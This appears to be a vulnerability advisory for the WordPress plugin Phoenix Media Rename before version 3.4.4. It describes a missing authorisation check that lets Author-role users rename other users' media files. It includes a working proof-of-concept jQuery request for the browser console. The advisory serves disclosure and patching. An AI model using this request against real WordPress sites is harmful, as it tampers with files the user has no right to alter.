## WordPress Plugin Vulnerabilities

# Phoenix Media Rename < 3.4.4 - Author Arbitrary Media File Renaming

### Description

The plugin does not have capability checks in its phoenix\_media\_rename AJAX action, which could allow users with Author roles to rename any uploaded media files, including ones they do not own.

### Proof of Concept

As an Author, go to the page to edit one of your own Media (ie /wp-admin/post.php?post=1993&action=edit, which contains the \_mr\_wp\_nonce nonce) and run the below in the Web Developer console (564 being the ID of the media the edit, which does not belong to the Author)
jQuery.post(ajaxurl, {
action: 'phoenix\_media\_rename',
type: "",
\_wpnonce: jQuery('#\_mr\_wp\_nonce').attr('value'),
new\_filename: "missingauthz",
post\_id:564
})
